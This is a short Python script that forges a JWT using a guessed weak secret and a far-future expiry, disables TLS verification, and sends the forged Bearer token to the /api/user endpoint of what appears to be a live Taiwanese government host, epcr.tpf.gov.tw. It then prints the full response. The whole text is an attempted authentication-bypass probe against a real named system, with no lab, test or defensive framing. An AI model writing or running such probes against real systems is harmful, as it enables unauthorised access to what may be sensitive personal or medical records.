import requests, jwt, urllib3
urllib3.disable_warnings()
s=requests.Session(); s.verify=False
t=jwt.encode({"exp":9999999999},"x"*40,algorithm="HS256")
r=s.get("https://epcr.tpf.gov.tw:4004/api/user",headers={"Authorization":"Bearer "+t},timeout=15)
print("STATUS",r.status_code,"SIZE",len(r.content))
print(repr(r.content.decode('utf-8','replace')))
